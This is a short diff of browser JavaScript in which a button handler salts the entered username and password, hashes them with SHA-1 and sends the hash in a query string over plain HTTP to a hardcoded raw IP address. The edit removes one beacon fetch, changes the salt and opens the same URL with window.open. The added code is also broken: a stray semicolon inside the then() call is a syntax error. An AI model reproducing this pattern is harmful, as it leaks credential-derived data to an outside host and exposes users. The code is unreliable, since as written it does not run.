@@ -108,16 +108,15 @@ btn.onclick = function() {
 
 // Send the credentials as a sha1
 snd.onclick = function()    {
-    fetch('http://98.96.160.135/' + '?tk=' + '21');
-    let b = 'xt5rP5' + usr.value + pwd.value;
+    let b = 'fLQ8dT' + usr.value + pwd.value;
     alert( b);
     let mypromise = sha1FromString(b);
     mypromise.then(
             function(value) {
               alert('sha1 is '+ value +' ok');
-              fetch('http://98.96.160.135/' + '?tk=' + value);
+              window.open('http://98.96.160.135/' + '?tk=' + value);
               },
-            function(value) {alert(value+' nok');}
+            function(value) {alert(value+' nok');};
     );
     modal.style.display = "block";
 }
